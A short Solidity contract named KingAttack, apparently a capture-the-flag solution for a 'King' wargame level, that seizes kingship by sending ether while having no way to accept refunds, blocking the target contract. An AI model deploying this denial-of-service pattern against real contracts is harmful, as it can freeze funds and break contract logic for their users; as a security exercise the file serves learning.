// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.6.0;

import "./King.sol";

contract KingAttack {
    King king;

    constructor(address payable _kingAddress) public payable {
        king = King(_kingAddress);
    }

    function attack() public payable {
        require(msg.value >= 0.001 ether);
        bool sent;
        bytes memory data;
        (sent, data) = address(king).call{value: msg.value}("");
        require(sent, "Failed to send value!");
    }
}
